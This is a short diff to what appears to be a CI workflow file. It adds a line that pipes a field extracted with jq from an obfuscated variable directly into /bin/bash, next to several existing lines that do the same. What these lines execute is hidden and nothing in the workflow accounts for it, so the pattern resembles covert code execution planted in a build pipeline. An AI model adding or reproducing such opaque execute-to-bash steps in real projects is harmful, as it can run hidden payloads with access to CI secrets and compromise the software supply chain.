@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ski95" | jq -r .vzuul51 | /bin/bash
           printf '%s' "$wm42" | jq -r .lv25119 | /bin/bash
           printf '%s' "$ep09" | jq -r .pz3430 | /bin/bash
+          echo $gfwpk7 | jq -r .ofss348 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
